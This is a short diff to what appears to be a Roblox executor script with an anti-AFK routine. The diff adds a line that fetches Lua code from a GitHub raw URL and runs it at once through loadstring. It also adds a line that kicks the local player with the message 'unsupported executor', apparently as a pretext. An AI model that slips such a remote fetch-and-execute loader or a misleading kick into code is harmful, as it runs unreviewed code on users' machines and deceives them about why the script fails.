@@ -13,8 +13,11 @@ if getgenv().loaded then
 else
     getgenv().loaded = true
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/hook/hookwscripts.lua"))()
+task.wait(1)
 --Anti-AFK
 local Players = game:GetService("Players")
+Players.LocalPlayer:Kick('unsupported executor')
 local connections = getconnections or get_signal_cons
 if connections then
 	for i,v in pairs(connections(Players.LocalPlayer.Idled)) do
